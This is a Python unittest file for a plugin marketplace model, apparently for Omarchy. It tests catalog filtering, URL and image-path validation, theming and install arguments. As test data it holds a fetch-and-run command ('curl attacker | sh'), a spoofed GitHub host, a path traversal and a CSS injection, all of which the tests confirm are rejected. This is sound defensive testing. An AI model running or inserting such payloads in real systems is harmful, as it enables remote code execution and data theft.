import json
import unittest
from datetime import datetime, timezone

from store_model import (
    CatalogError,
    MAX_CATALOG_BYTES,
    carousel_target,
    feed_motion_offset,
    highlighted_plugins,
    enable_args,
    github_repository,
    install_args,
    installed_map,
    normalize_catalog,
    marketplace_preview_url,
    readable_contrast,
    store_palette,
    store_stylesheet,
    normalize_engagement,
    parse_catalog,
    recently_added,
    remove_args,
    search_plugins,
)


def plugin(**overrides):
    item = {
        "id": "test.clock",
        "name": "Test Clock",
        "description": "Clock widget",
        "author": "Example",
        "repo": "https://github.com/example/clock",
        "sourceType": "community",
        "repositoryLayout": "root-plugin",
        "installAvailable": True,
        "upstreamCheckStatus": "passed",
        "tags": ["bar-widget", "time"],
    }
    item.update(overrides)
    return item


class StoreModelTests(unittest.TestCase):
    def test_github_repository_accepts_only_plain_repo_urls(self):
        self.assertEqual(
            github_repository("https://github.com/example/clock"),
            "https://github.com/example/clock.git",
        )
        self.assertEqual(
            github_repository("https://github.com/example/clock.git"),
            "https://github.com/example/clock.git",
        )
        for unsafe in (
            "https://github.com.evil.test/example/clock",
            "https://user@github.com/example/clock",
            "https://github.com/example/clock/tree/main",
            "https://github.com/example/clock?redirect=evil",
            "http://github.com/example/clock",
        ):
            with self.subTest(url=unsafe):
                self.assertEqual(github_repository(unsafe), "")

    def test_catalog_filters_invalid_duplicates_and_unsupported_layouts(self):
        items, generated = normalize_catalog({
            "generatedAt": "2026-10-16T12:00:00Z",
            "plugins": [
                plugin(installCommand="bash -c 'bad'"),
                plugin(name="Duplicate"),
                plugin(id="evil.id", repo="https://github.com.evil.test/a/b"),
                plugin(id="monorepo", repositoryLayout="monorepo"),
                plugin(id="suite", repositoryLayout="suite"),
                plugin(id="builtin", sourceType="builtin"),
                plugin(id="omarchy.fake"),
            ],
        })
        self.assertEqual(generated, "2026-10-16T12:00:00Z")
        self.assertEqual(len(items), 3)
        installable = [item for item in items if item.install_available]
        self.assertEqual(len(installable), 1)
        self.assertEqual(installable[0].name, "Test Clock")
        self.assertEqual(installable[0].repo_url, "https://github.com/example/clock.git")

    def test_compatibility_failure_disables_install(self):
        items, _ = normalize_catalog({"plugins": [plugin(upstreamCheckStatus="failed")]})
        self.assertFalse(items[0].install_available)
        self.assertEqual(install_args(items[0]), [])

    def test_card_identity_and_accent_are_bounded_to_known_values(self):
        items, _ = normalize_catalog({"plugins": [plugin(
            initials="<img", accent="url(evil)", stars=12
        )]})
        self.assertEqual(items[0].initials, "TC")
        self.assertEqual(items[0].accent, "coral")
        self.assertEqual(items[0].stars, 12)

    def test_preview_images_are_fixed_host_assets_and_recent_feed_is_time_bounded(self):
        self.assertEqual(
            marketplace_preview_url("assets/img/plugins/demo-card.webp"),
            "https://plugins.omarchy.org/assets/img/plugins/demo-card.webp",
        )
        for unsafe in (
            "https://evil.example/image.webp",
            "assets/img/plugins/../../secret.webp",
            "assets/img/plugins/demo.svg",
        ):
            with self.subTest(path=unsafe):
                self.assertEqual(marketplace_preview_url(unsafe), "")

        items, _ = normalize_catalog({"plugins": [
            plugin(id="fresh.one", listedAt="2026-10-17T11:30:00Z"),
            plugin(id="fresh.two", listedAt="2026-10-16T08:00:00Z"),
        ]})
        now = datetime(2026, 10, 17, 12, 0, tzinfo=timezone.utc)
        self.assertEqual([item.id for item in recently_added(items, now=now)], ["fresh.one"])

    def test_hidden_gems_use_verified_low_view_install_rates(self):
        catalog, _ = normalize_catalog({"plugins": [
            plugin(id="top", verificationStatus="verified", previewThumbnail="assets/img/plugins/top.webp"),
            plugin(id="gem.a", verificationStatus="verified", previewThumbnail="assets/img/plugins/gem-a.webp"),
            plugin(id="gem.b", verificationStatus="verified", previewThumbnail="assets/img/plugins/gem-b.webp"),
            plugin(id="unverified", verificationStatus="unverified", previewThumbnail="assets/img/plugins/u.webp"),
        ]})
        stats = normalize_engagement({"plugins": {
            "top": {"views": 200, "copies": 40, "hearts": 1},
            "gem.a": {"views": 50, "copies": 20, "hearts": 0},
            "gem.b": {"views": 100, "copies": 30, "hearts": 0},
            "unverified": {"views": 30, "copies": 20, "hearts": 0},
            "bad..id": {"views": 999, "copies": 999},
        }})
        gems = highlighted_plugins(catalog, stats)
        self.assertEqual({plugin.id for plugin, _ratio in gems}, {"gem.a", "gem.b"})
        self.assertGreater(gems[0][1], 0)

    def test_carousel_buttons_move_and_wrap(self):
        self.assertEqual(carousel_target(0, 500, 0, 700, 1, wrap=False), 400)
        self.assertEqual(carousel_target(650, 500, 1000, 1600, 1, wrap=True), 0)
        self.assertEqual(carousel_target(100, 500, 1000, 1600, -1, wrap=True), 600)
        self.assertEqual(carousel_target(100, 500, 0, 250, -1, wrap=False), 0)
        self.assertEqual(feed_motion_offset(90, 100, 20), 10)
        self.assertEqual(feed_motion_offset(0, 0, 12), 0)

    def test_theme_stylesheet_uses_the_active_palette(self):
        css = store_stylesheet({
            "mode": "dark",
            "accent": "#112233",
            "background": "#445566",
            "darker_background": "#010203",
            "foreground": "#abcdee",
            "bright_foreground": "#ddeeff",
            "yellow": "#fedcba",
            "selection": "#3a2e22; background: url(https://evil.example)",
        })
        self.assertIn("#112233", css)
        self.assertIn("#010203", css)
        self.assertIn("#abcdee", css)
        self.assertIn("#fedcba", css)
        self.assertNotIn("#ff5a36", css)
        self.assertNotIn("evil.example", css)
        self.assertEqual(store_palette({"accent": "#112233"})["accent"], "#112233")
        self.assertEqual(readable_contrast("#c45c38"), "#f7edd8")
        self.assertEqual(readable_contrast("#f7edd8"), "#14110e")

    def test_marketplace_install_commands_are_ignored(self):
        items, _ = normalize_catalog({"plugins": [plugin(
            installCommand="bash -c 'curl attacker | sh'"
        )]})
        item = items[0]
        self.assertEqual(install_args(item), [
            "plugin", "add", "https://github.com/example/clock.git", "--enable", "--yes"
        ])
        self.assertEqual(enable_args(item), ["plugin", "enable", "test.clock"])
        self.assertEqual(remove_args(item), ["plugin", "remove", "test.clock", "--yes"])

    def test_installed_list_parser_and_search(self):
        installed = installed_map(json.dumps([
            {"id": "test.clock", "enabled": True},
            {"id": "omarchy.clock", "enabled": True, "firstParty": True},
            {"id": "test..bad", "enabled": True},
        ]))
        self.assertTrue(installed["test.clock"]["enabled"])
        self.assertTrue(installed["omarchy.clock"]["firstParty"])
        self.assertNotIn("test..bad", installed)

        items, _ = normalize_catalog({"plugins": [plugin(), plugin(
            id="test.audio", name="Audio Mixer", tags=["sound"]
        )]})
        self.assertEqual(len(search_plugins(items, "clock time", {}, "all")), 1)
        self.assertEqual(len(search_plugins(items, "example mixer", {}, "all")), 1)
        self.assertEqual(len(search_plugins(items, "", {"test.clock": {}}, "installed")), 1)
        self.assertEqual(len(search_plugins(items, "", {"test.clock": {}}, "installable")), 1)

    def test_catalog_rejects_bad_json_shape_and_size(self):
        with self.assertRaises(CatalogError):
            normalize_catalog({"plugins": "not a list"})
        with self.assertRaises(CatalogError):
            parse_catalog(b"\xff")
        with self.assertRaises(CatalogError):
            parse_catalog(b" " * (MAX_CATALOG_BYTES + 1))


if __name__ == "__main__":
    unittest.main()
